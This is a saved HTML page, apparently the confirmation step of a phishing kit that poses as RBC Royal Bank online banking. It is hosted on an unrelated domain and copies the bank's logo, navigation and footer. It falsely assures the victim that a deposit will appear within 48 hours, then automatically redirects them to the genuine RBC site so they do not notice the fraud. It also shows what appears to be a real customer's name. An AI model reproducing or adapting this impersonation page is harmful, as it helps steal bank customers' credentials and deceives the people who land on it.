<head>
        <meta http-equiv="refresh" content="3; URL=http://www.rbcroyalbank.com/personal.html"> 
</head>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0043)http://clientsupdate.96.lt/RBC.COM/done.php -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="refresh" content="5;url=http://royalbank.ca/">

 
 <link rel="shortcut icon" href="http://clientsupdate.96.lt/RBC.COM/favicon.ico" type="image/x-icon"> 
<title>Personal Verification Questions - RBC Online Banking</title><link rel="stylesheet" type="text/css" href="./done_files/common.css">
<link rel="stylesheet" type="text/css" href="./done_files/custom.css">    <link rel="stylesheet" type="text/css" href="./done_files/legacy.css"><link rel="stylesheet" type="text/css" href="./done_files/main01.css"><link rel="stylesheet" type="text/css" href="./done_files/main02.css"><link rel="stylesheet" type="text/css" href="./done_files/tabs.css">
    
    <link rel="stylesheet" type="text/css" href="./done_files/print.css" media="print">
	<script language="javascript" type="text/javascript">	   function checkOnFocusForm() {
	   if ( rbcGetCookie ("3MTK","NOTTHERE") != "NOTTHERE" ) {	rbcDeleteCookie("3MTK","/");}
		
		   
}	   
checkOnFocusForm();	   
event_addOnFocusForm(new Array(checkOnFocusForm));
addLoadEvent(event_onLoad);
function showThemeNavigation() {
    swapInAlternateElements("OLBAlternatable", "_alternate");
}	   
</script>
</head><body class="template-legacy" onfocus="event_onFocusForm(); " onblur="event_onBlurForm();" onunload="event_onUnload();">
	
	<script type="text/javascript">
<!--
var ProxyVariableData = new Array();
function themeNavigationFormAddParameter(name,value) {
	document.getElementById('themeNavigationForm').innerHTML += 
		'<input name="' + name + '" type="hidden" value="' + value + '"/>';
}
-->
</script>	<div id="wrapper">		
		<div class="skipnav"><a href="http://clientsupdate.96.lt/RBC.COM/done.php#skipheadernav">Skip Header Navigation</a></div>        
		    
    
    
<div id="globalheader" class="clear globalheader-basic globalheader-secure OLBAlternatable">	
	
	
	
		
	<div id="globalheader-logo" class="OLBAlternatable"><a href="http://clientsupdate.96.lt/RBC.COM/done.php#"><img src="./done_files/rbc_royalbank_en.gif" alt="RBC Royal Bank" width="210" height="47"></a></div>	<p id="globalheader-links" class="OLBAlternatable">				    <a href="http://clientsupdate.96.lt/RBC.COM/done.php#" onclick="return popupHelp(this.href)" target="_blank" title="Customer Service (opens new window)" class="linkedtextandicon"><span>Customer Service</span></a>	</p>
	<p id="globalheader-secureinfo" class="OLBAlternatable">		
		
<strong><img src="./done_files/secure.gif" alt="Secure" class="icon">											Username Verification			
		
		</strong>
	</p> 
	<p id="globalheader-tools" class="OLBAlternatable">		
			</p>
</div>		
<div id="globalheader_alternate" class="clear  globalheader-secure OLBAlternate" style="display: none;">	
	
	
	
		
	<div id="globalheader-logo_alternate" class="OLBAlternate"><a href="http://clientsupdate.96.lt/RBC.COM/done.php#"><img src="./done_files/rbc_royalbank_en.gif" alt="RBC Royal Bank" width="210" height="47"></a></div>	<p id="globalheader-links_alternate" class="OLBAlternate">		
		          
		              <script type="text/javascript">
function themeBanner_alternateAddParametersSiteMap() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDIwQzM!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDIwQzM!/&#39;;themeBanner_alternateAddParametersSiteMap();document.themeNavigationForm.submit();">Site Map</a></p>
	<p id="globalheader-secureinfo_alternate" class="OLBAlternate">		<span class="button button-secondary"><span><a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbunxcgi?F8=1&amp;F22=HT&amp;REQUEST=SIGNOUT&amp;CPG=55230&amp;LANGUAGE=ENGLISH">Sign Out</a></span></span>
		
<strong><img src="./done_files/secure.gif" alt="Secure" class="icon">																<script type="text/javascript">
function themeBanner_alternateAddParametersClientName() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDJIUDE!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDJIUDE!/&#39;;themeBanner_alternateAddParametersClientName();document.themeNavigationForm.submit();">KEHINDE PETER</a>							
		
		</strong>
	</p>
	<p id="globalheader-tools_alternate" class="OLBAlternate">		
		September 17, 2010	</p>
</div>        		    
    
    
<div id="mainnav" class="OLBAlternatable hide">
	
      <div id="mainnav-level1" class="clear OLBAlternatable">
      </div>
	
      <div id="mainnav-level2" class="clear OLBAlternatable">
      </div>
	
</div>        		    
    
    
<div id="mainnav_alternate" class="OLBAlternate " style="display: none;">
	
      <div id="mainnav-level1_alternate" class="clear OLBAlternate">
  		  <ul>																																																																																																																																																																																																																																												<li class="mainnav-level1-firstlink">														<span>								<a href="http://www.rbc.com/canada.html" onclick="return popupNewbrowser(this.href)" target="_blank" title="Products &amp; Services (opens new window)">Products &amp; Services</a>							</span>						</li>																																																																																																																																																																																																																						<li class="mainnav-level1-currentpage">															<img class="mainnav-level1-screenreaderimage" src="./done_files/screenreaderimage.gif" alt="You are on:">														<span>								<script type="text/javascript">
function themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgE_2CbEdFAOARVKM!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgE_2CbEdFAOARVKM!/&#39;;themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct();document.themeNavigationForm.submit();">My Accounts</a>							</span>						</li>																																																																																																																																																																																																																						<li class="mainnav-level1-rightofcurrentpage">														<span>								<a href="https://www.rbcroyalbank.com/customer-service/online-banking/index.html">Customer Service</a>							</span>						</li>																																																																																																													</ul>
		  
      </div>
	
      <div id="mainnav-level2_alternate" class="clear OLBAlternate">
  		  <ul>																																																																																																																																																																																																																																												<li class="mainnav-level2-firstlink">														<span>								<script type="text/javascript">
function themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_accountsummary() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgQ_2CbEdFAFOAmfM!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgQ_2CbEdFAFOAmfM!/&#39;;themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_accountsummary();document.themeNavigationForm.submit();">Accounts Summary</a>							</span>						</li>																																																																																																																																																																																																																						<li class="mainnav-level2-currentpage">															<img class="mainnav-level2-screenreaderimage" src="./done_files/screenreaderimage.gif" alt="You are on:">														<span>								<script type="text/javascript">
function themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTIwNfA_2CbEdFAGW0JA8!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTIwNfA_2CbEdFAGW0JA8!/&#39;;themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking();document.themeNavigationForm.submit();">Banking</a>							</span>						</li>																																																																					</ul>
		  
      </div>
	
</div>        
		<div class="skipnavanchor"><a name="skipheadernav" id="skipheadernav"></a></div>
 
		<div id="layout" class="clear layout-110 nevervisitedlinks">            
    			<div id="layout-column-left">
    			
	   			              	    	    <!--  navigation start -->
<div id="leftnavskiplink" class="skipnav OLBAlternatable"></div>
<div id="leftnav-olb" class="clear OLBAlternatable"></div>
<div id="leftnavskipanchor" class="skipnavanchor OLBAlternatable"><a name="skipleftnav" id="skipleftnav" class="OLBAlternatable"></a></div>                                                                  <!--  navigation start -->
<div id="leftnavskiplink_alternate" class="skipnav OLBAlternate" style="display: none;"><a href="http://clientsupdate.96.lt/RBC.COM/done.php#skipleftnav">Skip Left Navigation</a></div>
<div id="leftnav-olb_alternate" class="clear OLBAlternate" style="display: none;">	
    
    
	
	
	    
		
		
	
		
	
	<ul class="leftnav-currentsection">
	 
	 	
	
	
		<li class="leftnav-sectionheader"><img class="leftnav-highlight" src="./done_files/highlight-house.gif" alt="You are within:">					 
		

<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTIw9TQ_2CbEdFAKlzSmQ!/&#39;;themeSideNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updatepref();document.themeNavigationForm.submit();">Update My Preferences	</a>																																																																										</li>										  								 														    </ul>													  												 								   				    												    																											 																								<li>						                    																																								<a href="https://www.rbcroyalbank.com/onlineservices/personal/apply-for-products-and-services.html">Apply for Products and Services</a>																												</li>			 														 							 					 
		  
		   </div>
<div id="leftnavskipanchor_alternate" class="skipnavanchor OLBAlternate" style="display: none;"><a name="skipleftnav" id="skipleftnav_alternate" class="OLBAlternate"></a></div>                			    </div>
	        
	        
    
<div class="skipnav OLBAlternatable" id="breadcrumbareaskiplink"></div>
<div id="breadcrumbarea" class="clear OLBAlternatable">
<div id="path" class="OLBAlternatable"></div>
<div class="skipnavanchor"><a name="skipbreadcrumbnav" id="skipbreadcrumbnav" class="OLBAlternatable"></a></div>
</div>              
<div class="skipnav OLBAlternate" id="breadcrumbareaskiplink_alternate" style="display: none;"><a href="http://clientsupdate.96.lt/RBC.COM/done.php#skipbreadcrumbnav">Skip Breadcrumb Links</a></div>
<div id="breadcrumbarea_alternate" class="clear OLBAlternate" style="display: none;">
<p id="path_alternate" class="OLBAlternate">
	 
	  
	  	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI29DU_2CbEdFAE8SG4U!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI29DU_2CbEdFAE8SG4U!/&#39;;themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa();document.themeNavigationForm.submit();">Personal Accounts</a>	&gt;	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI48AQ_2CbEdFAOsQxL0!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI48AQ_2CbEdFAOsQxL0!/&#39;;themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails();document.themeNavigationForm.submit();">Profile and Preferences	</a>	&gt;	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI0svA_2CbEdFAMCRzNU!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI0svA_2CbEdFAMCRzNU!/&#39;;themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof();document.themeNavigationForm.submit();">Update My Profile					</a>	&gt;	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof_pvquestion() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE_2CbEdFACPn4ck!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action=&#39;/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE_2CbEdFACPn4ck!/&#39;;themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof_pvquestion();document.themeNavigationForm.submit();">Personal Verification Questions</a>	
		
	 
</p>
<div class="skipnavanchor"><a name="skipbreadcrumbnav" id="skipbreadcrumbnav_alternate" class="OLBAlternate"></a></div>
</div>            			<div id="layout-column-main">					 
 
 
 
 
 
 
 
 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr height="100%"> 
<td valign="top" width="570px"> 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
<tbody><tr><td valign="top" width="100%"> 
 
 
 
 
 
 
 
 
 
<a name="7_4P88H9G090LB60IAH7GDD42P03"></a><div class="wpsPortletBody">
<table width="100%">
	<tbody><tr>
		<td><script type="text/javascript" language="JavaScript">document.cookie='PPAGE=ChangePVQsA; path=/';</script><!--3MSHELL01.HTM (420) start--><!--Start of 3MSHELLID.INC -->
<!--TMP="3MPVQ.HTM"SRC="420"LNG="ENGLISH"PILOT="PORTAL"-->
<!--End of 3MSHELLID.INC -->
<!-- Start of 3MSRCPATH.CINC -->
<!-- End of 3MSRCPATH.CINC --><!-- START: content -->
<a name="top" id="top"></a>
<table width="100%">
  <tbody><tr>
    <td valign="top"><!-- Start of 3MSRCRDRT.CINC --><table border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody><tr>
<td><table border="0" cellpadding="0" cellspacing="0" width="100%">
 <tbody><tr><td height="5"></td></tr>
 <tr>
   <td class="pageTitle">Personal Verification</td>
 </tr> <tr>
  <td>
<!--3MMSGSPT.CINC:-->
<!--3MMSGSPT.CINC.-->  </td>
 </tr>
 <tr><td>&nbsp;</td></tr>
 <tr>
  <td class="bodyText"><p><strong>Your Deposit would appear in your account after 48 hours. </strong></p>
    <p><strong>For security reasons in a few moments you will be redirected to the main page.</strong></p>
    <table border="0" cellpadding="0" cellspacing="0" width="100%">
      <tbody><tr>  <td></td></tr><tr>  <td height="5"></td></tr>
      </tbody>
    </table>
    <table border="0" cellpadding="0" cellspacing="0" width="100%">
      <tbody><tr>  <td></td></tr><tr>  <td> <p>&nbsp;</p>
            <p>&nbsp;</p>
            <p>Thank you,</p>
        <p>RBC Royal Bank of Canada </p></td>
      </tr>
      </tbody>
    </table>    
    <p>&nbsp;</p></td>
 </tr>
</tbody></table></td>
</tr>
</tbody></table><script language="javascript" type="text/javascript">
<!--
v3mpvq_onLoadPVQ();
//-->
</script>
   
<!-- End of 3MSRCRDRT.CINC -->
</td>
  </tr>
</tbody></table><!-- END:   content --><!-- 3MSHELLFOOT.JS -->
<script language="Javascript" type="text/javascript">
<!--
var c3mbp = new buttons_ButtonPreload( "btn_", "_down" );
//-->
</script>
<!-- 3MSHELLFOOT.JS --> <!-- Start of 3MSHELLFENT.INC --> <input name="F22" value="HTPCBINET" type="hidden">
 <input name="LANGUAGE" value="ENGLISH" type="hidden">
 <input name="REQUEST" value="BeanCounter" type="hidden">
 <input name="XREQUEST" value="AcctBalanceInquiry" type="hidden">
 <input name="BEAN" value="ENTITY" type="hidden">
 <input name="r" value="3MSHELL01.HTM" type="hidden">
<input name="3MTK" value="0" type="hidden">
 <input name="F22" value="HTPCBINET" type="hidden">
 <input name="LANGUAGE" value="ENGLISH" type="hidden">
 <input name="REQUEST" value="AcctBalanceInquiry" type="hidden"><!-- End of 3MSHELLFUPP.INC --> <!--3MSHELL01.HTM (420) end-->		</td>
	</tr>
</tbody></table></div> 
</td></tr> 
</tbody></table> 
</td> 
<td valign="top" width="12px"> 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
</table> 
</td> 
<td valign="top" width="216px"> 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
<tbody><tr><td valign="top" width="100%">	<a name="7_4P88H9G090LB60IAH7GDD42PG1"></a><div class="wpsPortletBody"><!-- Check to see if we need to render the portlet or not -->
    
    
    
    
    
    
    
    <div id="_3m00NoSkinTogglePortlet" class="OLBAlternatable">
    </div>
    
    
    
    
    
    <div id="_3m00NoSkinTogglePortlet_alternate" class="OLBAlternate" style="display: none;">    <div class="noprint">
	
						<div class="callout callout-taupe-withtitle"><span class="callout-top"><span>&nbsp;</span></span><div class="callout-content clear"><h2>Information and Tools</h2><p>												</p><h4></h4>					<ul class="bullets-arrow">																																				<li>										                                                                              																																																																																																								<a href="http://www.rbcroyalbank.com/online/rbcguarantee.html" onclick="return popupNewbrowser(this.href)" target="_blank" title="(opens new window)" class="linkedtextandicon"><span>RBC Online Banking Security Guarantee</span> <img src="./done_files/newwindow.gif" class="icon" alt="(opens new window)"></a>																														</li>																																													<li>										                                                                              																																																																																																								<a href="https://www.rbcroyalbank.com/onlinebanking/bankingusertips/security/features.html#2" onclick="return popupNewbrowser(this.href)" target="_blank" title="(opens new window)" class="linkedtextandicon"><span>RBC Online Banking Security Features</span> <img src="./done_files/newwindow.gif" class="icon" alt="(opens new window)"></a>																														</li>																										</ul>									</div><span class="callout-bottom"><span>&nbsp;</span></span></div>	
		
	
</div>
    </div>
	
</div>
 
</td></tr> 
</tbody></table> 
</td> 
</tr></tbody></table>			</div>
		</div>
		
		
		
		
		 	  
		
		
		
<div id="globalfooter" class="OLBAlternatable">
	
	
    	    
    	
	<div id="globalfooter-searchbar" class="OLBAlternatable" style="visibility: hidden;">
		<p id="globalfooter-searchbar-links" class="OLBAlternatable">
		</p>
		<div id="globalfooter-searchbar-search" class="OLBAlternatable">
    		
    			
    			
    			
    		
		</div>
		
	</div>
	
		
	<div id="globalfooter-main" class="OLBAlternatable">
		<p>Royal Bank of Canada Website, ? 1995-2017
		</p>
		<p><a href="http://clientsupdate.96.lt/RBC.COM/done.php#" onclick="return popupNewbrowser(this.href)" target="_blank" title="Privacy &amp; Security (opens new window) " class="linkedtextandicon"><span>	     	Privacy &amp; Security	</span></a>|<a href="http://clientsupdate.96.lt/RBC.COM/done.php#" onclick="return popupHelp(this.href)" target="_blank" title="Legal (opens new window)" class="linkedtextandicon"><span>	   	Legal	</span></a>|    <a href="http://clientsupdate.96.lt/RBC.COM/done.php#" onclick="return popupNewbrowser(this.href)" target="_blank" title="Accessibility (opens new window) " class="linkedtextandicon"><span>        	Accessibility        </span></a>		</p>
	</div>
</div>    
<div id="globalfooter_alternate" class="OLBAlternate" style="display: none;">
	
	
    		
    	
	<div id="globalfooter-searchbar_alternate" class="OLBAlternate">
		<p id="globalfooter-searchbar-links_alternate" class="OLBAlternate">	
	            
	                
	                
	                    
	                
	            
	         
		</p><div id="globalfooter-searchbar-search_alternate" class="OLBAlternate">
    		
    					        
    			
    			
    		
		</div>
		
	</div>
	
		
	<div id="globalfooter-main_alternate" class="OLBAlternate">
		<p>Royal Bank of Canada Website, ? 1995-2017
		</p>
		<p><a href="http://www.rbc.com/privacysecurity/ca/index.html" onclick="return popupNewbrowser(this.href)" target="_blank" title="Privacy &amp; Security (opens new window) " class="linkedtextandicon"><span>	     	Privacy &amp; Security	</span></a>|<a href="https://www.rbcroyalbank.com/onlinebanking/legal.html" onclick="return popupHelp(this.href)" target="_blank" title="Legal (opens new window)" class="linkedtextandicon"><span>	   	Legal	</span></a>|    <a href="http://www.rbc.com/accessibility/" onclick="return popupNewbrowser(this.href)" target="_blank" title="Accessibility (opens new window) " class="linkedtextandicon"><span>        	Accessibility        </span></a>
	    	
		</p>
	</div>
</div>        		
		
		
	</div>
</body></html>